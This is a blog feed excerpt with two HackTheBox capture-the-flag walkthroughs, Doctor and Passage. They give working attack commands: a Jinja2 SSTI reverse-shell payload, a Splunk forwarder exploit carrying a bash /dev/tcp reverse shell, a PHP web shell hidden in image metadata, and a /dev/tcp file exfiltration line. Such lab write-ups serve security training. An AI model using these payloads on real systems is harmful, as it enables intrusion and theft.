Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">session=.eJwlzj0OwjAMQOG7eGZI7MSJe5kq_hOsLZ0Qd6cS69Mbvg_secT5hO19XPGA_eWwQRMSDJdkRrMYOFNNMZvRdM5gth6jkLulV3JtOS1EFOsQGlNMDDXW_VN37GFzmbaGrWhiFq-r91aVlGWsdMV1ByYeZfJShBtynXH8NQjfH00QMJk.YBo8Bw.h165pwEGvKjGaPS-d3RiIO-xe34</span>
Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>

title=test&amp;content=test&amp;submit=Post
</code></pre></div><p>I fed the request to <code>SQLMap</code>, but it doesn&rsquo;t seem injectable.</p>
<p>And then I looked into Wapplyzerーa web plugin that can be used to identify the technology stacks behind a websiteー, and it shows <code>doctors.htb</code> uses Flask as its backend.</p>
<p><div class="img-container"><img src="imgs/136d4a7725d44c5a9de3b53bd18bfdb9.png" alt="136d4a7725d44c5a9de3b53bd18bfdb9"  /></div>
</p>
<h4 id="server-side-template-injection-ssti">Server Side Template Injection (SSTI)</h4>
<p>Web applications that use Python Flask are typically run with a templating engine such as Jinja. On every templating engine, SSTI can occur when an un-sanitized user input is passed directly into the application templating process.</p>
<blockquote>
<p>PwnFunction’s video on <a href="https://www.youtube.com/watch?v=SN6EVIG4c-0">SSTI</a> was very informative.</p>
<p>TryHackMe also has a room called “<a href="https://tryhackme.com/room/flask">Flask</a>” that contains an example of SSTI attack on Flask. I have completed that room, and  the note is available on my <a href="https://github.com/fahmifj/TryHackMe-notes/tree/main/flask">GitHub</a>.</p>
</blockquote>
<p>Here is the methodology to detect SSTI (taken from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#methodology">here</a>):</p>
<p><div class="img-container"><img src="imgs/serverside.png" alt="SSTI cheatsheet workflow"  /></div>
</p>
<p><code>http://doctors.htb/home?page=1</code> is the first attack surface to target. I used a tool called <code>Tplmap.py</code> to automatically detect SSTI, but no luck.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «exploits» «10.10.14.3»
$ python tplmap.py -u <span style="color:#e6db74">&#39;http://doctors.htb/home?page=iamf&#39;</span>                             
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Tplmap 0.5
    Automatic Server-Side Template Injection Detection and Exploitation Tool
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Testing <span style="color:#66d9ef">if</span> GET parameter <span style="color:#e6db74">&#39;page&#39;</span> is injectable
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Smarty plugin is testing rendering with tag <span style="color:#e6db74">&#39;*&#39;</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Smarty plugin is testing blind injection
...&lt;SNIP&gt;...
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Ruby plugin is testing blind injection
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Ejs plugin is testing rendering with tag <span style="color:#e6db74">&#39;*&#39;</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Ejs plugin is testing blind injection
<span style="color:#f92672">[</span>!<span style="color:#f92672">][</span>checks<span style="color:#f92672">]</span> Tested parameters appear to be not injectable.
</code></pre></div><p>The second attack surface is <code>http://doctors.htb/post/new</code>, which allows me to create a post message. It consists of two input vectors: the title and the content/message.</p>
<p><div class="img-container"><img src="imgs/image-20210509023608857.png" alt="image-20210509023608857"  /></div>
</p>
<p>I copied the basic SSTI payloads for Jinja2 from PayloadAllTheThings to the post content, but it doesn&rsquo;t return the expected result.</p>
<p><div class="img-container"><img src="imgs/image-20210509024048415.png" alt="image-20210509024048415"  /></div>
</p>
<p>It returns nothing as well when I submit the payloads on the title.</p>
<p>After hours trying to figure out why it doesn&rsquo;t work, I noticed that the <code>/archive</code> page occasionally returns an error after I put some payload that has the percentage symbol <code>{% payload %}</code> on the content/message section.</p>
<p><div class="img-container"><img src="imgs/image-20210509024504730.png" alt="image-20210509024504730"  /></div>
</p>
<p>Or sometimes it only has the post title that can be seen only from page source.</p>
<p><div class="img-container"><img src="imgs/image-20210509024707956.png" alt="image-20210509024707956"  /></div>
</p>
<p>So from there, I submitted the basic payload on the title.</p>
<p><img src="imgs/image-20210509025456790.png" alt="image-20210509025456790" style="zoom:50%;" /></p>
<p>Right after inserting the payload, I checked the page source of <code>/archive</code>, and I found the SSTI expected result there.</p>
<p><div class="img-container"><img src="imgs/image-20210509025854497.png" alt="image-20210509025854497"  /></div>
</p>
<h4 id="reverse-shell">Reverse Shell</h4>
<p>The cheat-sheet from PayloadAllTheThings also contains a pre-crafted payload to get a reverse shell. All I have to do now is replace the IP address with mine and have my <code>nc</code> listener listening on the port I specified.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">{<span style="color:#f92672">%</span> <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> ()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__() <span style="color:#f92672">%</span>}{<span style="color:#f92672">%</span> <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;warning&#34;</span> <span style="color:#f92672">in</span> x<span style="color:#f92672">.</span>__name__ <span style="color:#f92672">%</span>}{{x()<span style="color:#f92672">.</span>_module<span style="color:#f92672">.</span>__builtins__[<span style="color:#e6db74">&#39;__import__&#39;</span>](<span style="color:#e6db74">&#39;os&#39;</span>)<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#34;python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">10.10.14.4</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">,9000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">/bin/sh</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">,</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">-i</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">]);&#39;&#34;</span>)}}{<span style="color:#f92672">%</span>endif<span style="color:#f92672">%</span>}{<span style="color:#f92672">%</span> endfor <span style="color:#f92672">%</span>}
</code></pre></div><p>I have an interactive shell now.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «doctor» «10.10.14.3» 
$ nc -nvlp <span style="color:#ae81ff">9000</span>            
listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">9000</span> ...
connect to <span style="color:#f92672">[</span>10.10.14.34<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.209<span style="color:#f92672">]</span> <span style="color:#ae81ff">5628</span>
/bin/sh: 0: can’t access tty; job control turned off
$ which python
$ which python3
/usr/bin/python3
$ python3 -c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
web@doctor:~$ id
uid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>web<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>web<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>web<span style="color:#f92672">)</span>,4<span style="color:#f92672">(</span>adm<span style="color:#f92672">)</span>
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-shaun">Shell as shaun</h3>
<h4 id="internal-enumeration">Internal Enumeration</h4>
<p>These are the users who a shell.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">web@doctor:~$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
web:x:1001:1001:,,,:/home/web:/bin/bash
shaun:x:1002:1002:shaun,,,:/home/shaun:/bin/bash
splunk:x:1003:1003:Splunk Server:/opt/splunkforwarder:/bin/bash
</code></pre></div><p>Because <code>web</code> is a member of the <code>adm</code> group, I can read the log files at <code>/var/log</code>. While enumerating with <code>find</code> command, I caught an Apache2 log called &ldquo;backup&rdquo;.</p>
<pre><code>web@doctor:~$ find / -type f -readable -group adm 2&gt;/dev/null
/var/log/kern.log.3.gz
/var/log/auth.log
/var/log/syslog
/var/log/ufw.log.2.gz
/var/log/dmesg.2.gz
/var/log/auth.log.1
...&lt;SNIP&gt;...
/var/log/apache2/backup
</code></pre><p>Searching string &ldquo;pass&rdquo; on the backup log finds this line.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">web@doctor:/var/log/apache2$ cat backup | grep pass
10.10.14.4 - - <span style="color:#f92672">[</span>05/Sep/2020:11:17:34 +2000<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;POST /reset_password?email=Guitar123&#34;</span> <span style="color:#ae81ff">500</span> <span style="color:#ae81ff">453</span> <span style="color:#e6db74">&#34;http://doctor.htb/reset_password&#34;</span>
</code></pre></div><p>It printed as <code>email=Guitar123</code>, but it doesn&rsquo;t look like an email.</p>
<h4 id="su---shaun">SU - shaun</h4>
<p>It turns out that <code>Guitar123</code> is shaun&rsquo;s password.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">web@doctor:/var/log/apache2$ su shaun
Password: Guitar123
web@doctor:/var/log/apache2$ id
uid<span style="color:#f92672">=</span>1002<span style="color:#f92672">(</span>shaun<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1002<span style="color:#f92672">(</span>shaun<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1002<span style="color:#f92672">(</span>shaun<span style="color:#f92672">)</span>
</code></pre></div><p>User flag is done here.</p>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="exploiting-splunk-with-pysplunkwhisperer2">Exploiting Splunk with PySplunkWhisperer2</h4>
<p>Recall the Splunk Forwarder, which by BookHackTrick is categorized as a privilege escalation vector.</p>
<p>The researcher stated that the Splunk UF agent&rsquo;s username is always admin.</p>
<blockquote>
<p>Universal Forwarder is accessible on each host at https://host:8089. Accessing any of the protected API calls, such as /service/ pops up a  Basic authentication box. The username is always admin, and the password default used to be changeme until 2016 &hellip;</p>
</blockquote>
<p>But that&rsquo;s not the case on this machine, because I can use <code>shaun:Guitar123</code> to authenticate to the Splunk UF services on port 8089.</p>
<p>I tried <a href="https://github.com/cnotin/SplunkWhisperer2">this PoC</a> from GitHub using the bash reverse shell as payload,</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «exploits» «10.10.14.3»
$ python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --port <span style="color:#ae81ff">8089</span> --username shaun --password Guitar123 --payload <span style="color:#e6db74">&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.3/9001 0&gt;&amp;1&#39;&#34;</span> --lhost 10.10.14.3
Running in remote mode <span style="color:#f92672">(</span>Remote Code Execution<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>.<span style="color:#f92672">]</span> Authenticating...
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Authenticated
<span style="color:#f92672">[</span>.<span style="color:#f92672">]</span> Creating malicious app bundle...
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Created malicious app bundle in: /tmp/tmpkwnss3rw.tar
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Started HTTP server <span style="color:#66d9ef">for</span> remote mode
<span style="color:#f92672">[</span>.<span style="color:#f92672">]</span> Installing app from: http://10.10.14.3:8181/
10.10.10.209 - - <span style="color:#f92672">[</span>03/Feb/2021 05:09:23<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET / HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> -
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> App installed, your code should be running now!
</code></pre></div><p>and it worked smoothly.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">→ root@kali «doctor» «10.10.14.3» 
$ nc -nvlp 9001
listening on [any] 9001 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.209] 48834
bash: cannot set terminal process group (1137): Inappropriate ioctl for device
bash: no job control in this shell
root@doctor:/# id
id
uid=0(root) gid=0(root) groups=0(root)
</code></pre></div><p>I can grab the root flag.</p>
<p><div class="img-container"><img src="imgs/image-20210509042058603.png" alt="image-20210509042058603"  /></div>
</p>
<hr>
<h2 id="references">References</h2>
<ul>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2</a></li>
<li><a href="https://www.youtube.com/watch?v=SN6EVIG4c-0">https://www.youtube.com/watch?v=SN6EVIG4c-0</a></li>
<li><a href="https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/">https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Passage</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-passage/</link>
      <pubDate>Fri, 07 May 2021 19:30:38 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-passage/</guid>
      <description>Leveraging USBCreator for local privilege escalation on Linux</description>
      <content:encoded><![CDATA[<p>Passage is a medium difficulty Linux machine from HackTheBox that features a news management software called CuteNews. The software is known to be vulnerable to a remote code execution, allowing an attacker to gain a foothold on the system via the avatar upload feature. Looking into the source files of the software discovers a few password hashes that can be recovered using a dictionary attack. One of the recovered passwords can be used to escalate to the first user, and it turns out that this user is using the same SSH key as the second user. There is an unpatched package called USBCreator that allows an attacker to perform Arbitrary File Write as root without supplying a password.</p>
<h3 id="skills-learned">Skills Learned</h3>
<ul>
<li>
<p>CuteNews 2.1.2 exploitation</p>
</li>
<li>
<p>USBCreator D-bus exploitation</p>
</li>
</ul>
<h3 id="tools">Tools</h3>
<ul>
<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
<li>Nmap - Preinstalled in Kali Linux</li>
<li>hashcat (Windows) - <a href="https://hashcat.net/hashcat/">https://hashcat.net/hashcat/</a></li>
<li>Exiftool - <a href="https://exiftool.org/">https://exiftool.org/</a></li>
<li>gdbus - Preinstalled in the target machine.</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>An initial nmap discovers two open ports, SSH on port 22 and HTTP running Apache web server on port 80.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «passage» «10.10.14.31»
$ mkdir nmap; nmap -sC -sV -oN initial-passage -v 10.10.10.206
<span style="color:#75715e"># Nmap 7.80 scan initiated Sat Sep  5 15:39:12 2020 as: nmap -sC -sV -oN initial-passage -v 10.10.10.206</span>
Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.206
Host is up <span style="color:#f92672">(</span>0.074s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">998</span> closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu <span style="color:#ae81ff">4</span> <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
| ssh-hostkey:
|   <span style="color:#ae81ff">2048</span> 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
|   <span style="color:#ae81ff">256</span> 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
|_  <span style="color:#ae81ff">256</span> fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
80/tcp open  http    Apache httpd 2.4.18 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
|_http-title: Passage News
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre></div><p>As SSH usually requires credentials, I&rsquo;ll enumerate the web server on port 80.</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>The page presenting a kind of news website called &ldquo;Passage News&rdquo;.</p>
<p><div class="img-container"><img src="imgs/d7ac9042cb934e58912a75669587968e.png" alt="d7ac9042cb934e58912a75669587968e"  /></div>
</p>
<p>The post titled &ldquo;Implemented Fail2Ban&rdquo; states that they have implemented the Fail2Ban feature. Knowing this, I will avoid any kind of brute force attack here.</p>
<p><div class="img-container"><img src="imgs/9eb82005d29d4c4e85aaa22c778203b0.png" alt="9eb82005d29d4c4e85aaa22c778203b0"  /></div>
</p>
<p>Inspecting the page sources finds a directory called &ldquo;CuteNews&rdquo;. I also find the hostname as <code>passage.htb</code>.</p>
<p><div class="img-container"><img src="imgs/c78e8e637c114e089fc80228b7b92d20.png" alt="c78e8e637c114e089fc80228b7b92d20"  /></div>
</p>
<p>Adding <code>/CuteNews</code> to the URL redirects me to a login page.</p>
<p><div class="img-container"><img src="imgs/7fa49ed1b8fc47d6ad274565962e4007.png" alt="7fa49ed1b8fc47d6ad274565962e4007"  /></div>
</p>
<p>I can register as normal user.</p>
<p><div class="img-container"><img src="imgs/image-20210508014328401.png" alt="image-20210508014328401"  /></div>
</p>
<h4 id="searchsploit">Searchsploit</h4>
<p>I threw &ldquo;CuteNews 2.1.2&rdquo; to <code>searchsploit</code> and it returned several exploits.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «passage» «10.10.14.31»
$ searchsploit <span style="color:#e6db74">&#39;CuteNews 2.1.2&#39;</span>
------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                     |  Path
------------------------------------------------------------------- ---------------------------------
CuteNews 2.1.2 - <span style="color:#e6db74">&#39;avatar&#39;</span> Remote Code Execution <span style="color:#f92672">(</span>Metasploit<span style="color:#f92672">)</span>       | php/remote/46698.rb
CuteNews 2.1.2 - Arbitrary File Deletion                           | php/webapps/48447.txt
CuteNews 2.1.2 - Authenticated Arbitrary File Upload               | php/webapps/48458.txt
------------------------------------------------------------------- ---------------------------------
</code></pre></div><p>I&rsquo;ll go with the &lsquo;avatar&rsquo; RCE.</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-www-data">Shell as www-data</h3>
<h4 id="cutenews-cve-2019-11447">CuteNews CVE-2019-11447</h4>
<p>It turns out the &lsquo;avatar&rsquo; RCE exploit was a CVE. The exploit module description as follows:</p>
<blockquote>
<p>This module exploits a command execution vulnerability in CuteNews prior to 2.1.2.
The attacker can infiltrate the server through the avatar upload process in the profile area.
There is no realistic control of the $imgsize function in &ldquo;/core/modules/dashboard.php&rdquo;
Header content of the file can be changed and the control can be bypassed.
We can use the &ldquo;GIF&rdquo; header for this process.
An ordinary user is enough to exploit the vulnerability. No need for admin user.
The module creates a file for you and allows RCE.</p>
</blockquote>
<p>I can also exploit this manually.</p>
<p>I still have the payload that I made using <code>exiftool</code> in my previous <a href="/writeup/htb-magic">Magic write-up</a>. If I don&rsquo;t have it, I can create a new one, embedding a PHP web shell as a comment.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «passage» «10.10.14.31»
$ exiftool -Comment<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&lt;?php echo &#34;&lt;pre&gt;&#34;; system($_GET[&#34;cmd&#34;]); ?&gt;&#39;</span> iamf.jpg
</code></pre></div><p>I&rsquo;ll rename my jpeg image to <code>iamfr.php</code>, and then I&rsquo;ll upload it as my avatar (Dashboard &ndash;&gt; Personal Options).</p>
<p><div class="img-container"><img src="imgs/image-20210508022032162.png" alt="image-20210508022032162"  /></div>
</p>
<p>The image is located at <code>http://passage.htb/CuteNews/uploads/avatar_iamf_iamfr.php</code></p>
<p><img src="imgs/image-20210508023129512.png" alt="image-20210508023129512" style="zoom:67%;" /></p>
<p>I&rsquo;ll send a Python reverse shell through the web shell and capture it on my <code>nc</code> listener.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">http://passage.htb/CuteNews/uploads/avatar_iamf_iamfr.php?cmd<span style="color:#f92672">=</span>python3 -c <span style="color:#e6db74">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.14.31&#34;,9000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/bash&#34;,&#34;-i&#34;]);&#39;</span>
</code></pre></div><p>I have an interactive shell now.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «passage» «10.10.14.31»
$ rlwrap nc -nvlp <span style="color:#ae81ff">9001</span>
listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">9001</span> ...
connect to <span style="color:#f92672">[</span>10.10.14.31<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.206<span style="color:#f92672">]</span> <span style="color:#ae81ff">37062</span>
bash: cannot set terminal process group <span style="color:#f92672">(</span>1678<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
bash: no job control in this shell
www-data@passage:/var/www/html/CuteNews/uploads$ id
id
uid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span>
www-data@passage:/var/www/html/CuteNews/uploads$ python -c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
www-data@passage:/var/www/html/CuteNews/uploads$
www-data@passage:/var/www/html/CuteNews/uploads$ export TERM<span style="color:#f92672">=</span>xterm-256color
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-paul">Shell as paul</h3>
<h4 id="internal-enumeration">Internal Enumeration</h4>
<p>There are two users in home directory.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@passage:/var/www/html/CuteNews/uploads$ ls -l /home
ls -l /home
total <span style="color:#ae81ff">8</span>
drwxr-x--- <span style="color:#ae81ff">17</span> nadav nadav  <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">5</span> 09:21 nadav
drwxr-x--- <span style="color:#ae81ff">17</span> paul  paul   <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">5</span> 08:32 paul
</code></pre></div><p>On <code>/var/www/html/CuteNews/cdata/users</code>, I finds a bunch of PHP files contains data encoded in base64. Some of the file contains PHP tags.</p>
<p><div class="img-container"><img src="imgs/image-20210508025611714.png" alt="image-20210508025611714"  /></div>
</p>
<blockquote>
<p>Apologize for the image quality (also for the white background), it was recovered from my KeepNote app.</p>
</blockquote>
<p>I&rsquo;ll send those files to my machine as one file using <code>cat</code> and <code>dev/tcp</code> trick</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@passage:/var/www/html/CuteNews/cdata/users$ cat *.php &gt; /dev/tcp/10.10.14.31/9000
</code></pre></div><p>I redirected it to a file called <code>cdata.users</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «passage» «10.10.14.31»
$ nc -nvlp <span style="color:#ae81ff">9000</span> &gt; cdata.users
listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">9000</span> ...
connect to <span style="color:#f92672">[</span>10.10.14.31<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.206<span style="color:#f92672">]</span> <span style="color:#ae81ff">55022</span>
</code></pre></div><p>I can perform a bulk decode on the file contents after removing the PHP tags.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «passage» «10.10.14.31»
$ cat cdata.users| sed <span style="color:#e6db74">&#39;s/&lt;?php[^&gt;]*&gt;//g&#39;</span> | base64 -d
cat cdata.users| sed <span style="color:#e6db74">&#39;s/&lt;?php[^&gt;]*&gt;//g&#39;</span> | base64 -d
a:1:<span style="color:#f92672">{</span>s:5:<span style="color:#e6db74">&#34;email&#34;</span>;a:1:<span style="color:#f92672">{</span>s:16:<span style="color:#e6db74">&#34;paul@passage.htb&#34;</span>;s:10:<span style="color:#e6db74">&#34;paul-coles&#34;</span>;<span style="color:#f92672">}}</span>a:1:<span style="color:#f92672">{</span>s:2:<span style="color:#e6db74">&#34;id&#34;</span>;a:1:<span style="color:#f92672">{</span>i:1598829833;s:6:<span style="color:#e6db74">&#34;egre55&#34;</span>;<span style="color:#f92672">}}</span>a:1:<span style="color:#f92672">{</span>s:5:<span style="color:#e6db74">&#34;email&#34;</span>;a:1:<span style="color:#f92672">{</span>s:15:<span style="color:#e6db74">&#34;ahaha@gmail.com&#34;</span>;s:8:<span style="color:#e6db74">&#34;ivanpogi&#34;</span>;<span style="color:#f92672">}}</span>a:2:<span style="color:#f92672">{</span>s:5:<span style="color:#e6db74">&#34;email&#34;</span>;a:1:<span style="color:#f92672">{</span>s:15:<span style="color:#e6db74">&#34;egre55@test.com&#34;</span>;s:6:<span style="color:#e6db74">&#34;egre55&#34;</span>;<span style="color:#f92672">}</span>s:4:<span style="color:#e6db74">&#34;name&#34;</span>;a:1:<span style="color:#f92672">{</span>s:4:<span style="color:#e6db74">&#34;debo&#34;</span>;a:11:<span style="color:#f92672">{</span>s:2:<span style="color:#e6db74">&#34;id&#34;</span>;s:10:<span style="color:#e6db74">&#34;1599412470&#34;</span>;s:4:<span style="color:#e6db74">&#34;name&#34;</span>;s:4:<span style="color:#e6db74">&#34;debo&#34;</span>;s:3:<span style="color:#e6db74">&#34;acl&#34;</span>;s:1:<span style="color:#e6db74">&#34;4&#34;</span>;s:5:<span style="color:#e6db74">&#34;email&#34;</span>;s:13:<span style="color:#e6db74">&#34;debo@debo.com&#34;</span>;s:4:<span style="color:#e6db74">&#34;nick&#34;</span>;s:4:<span style="color:#e6db74">&#34;debo&#34;</span>;s:4:<span style="color:#e6db74">&#34;pass&#34;</span>;s:64:<span style="color:#e6db74">&#34;b2cf7db7a51da35f8fa412f47f16cfea46090b75e399fde5ec6a0ec90250df52&#34;</span>;s:4:<span style="color:#e6db74">&#34;more&#34;</span>;s:60:<span style="color:#e6db74">&#34;YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==&#34;</span>;s:6:<span style="color:#e6db74">&#34;avatar&#34;</span>;s:20:<span style="color:#e6db74">&#34;avatar_debo_bash.php&#34;</span>
...&lt;SNIP&gt;...
</code></pre></div><p>And that was a mess.</p>
<p>Among those outputs, this one concerns me.</p>
<pre><code>&quot;pass&quot;;s:64:&quot;b2cf7db7a51da35f8fa412f47f16cfea46090b75e399fde5ec6a0ec90250df52&quot;
</code></pre><p><code>hash-identifier</code> identifies it as SHA-256.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «passage» «192.168.43.234»
$ hash-identifier 84c7cd94cb0d818d27b16d4290d13703d380c54a4d3696fff4587b2862bf6068
   <span style="color:#75715e">#########################################################################</span>
   <span style="color:#75715e">#     __  __                     __           ______    _____           #</span>
   <span style="color:#75715e">#    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #</span>
   <span style="color:#75715e">#    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #</span>
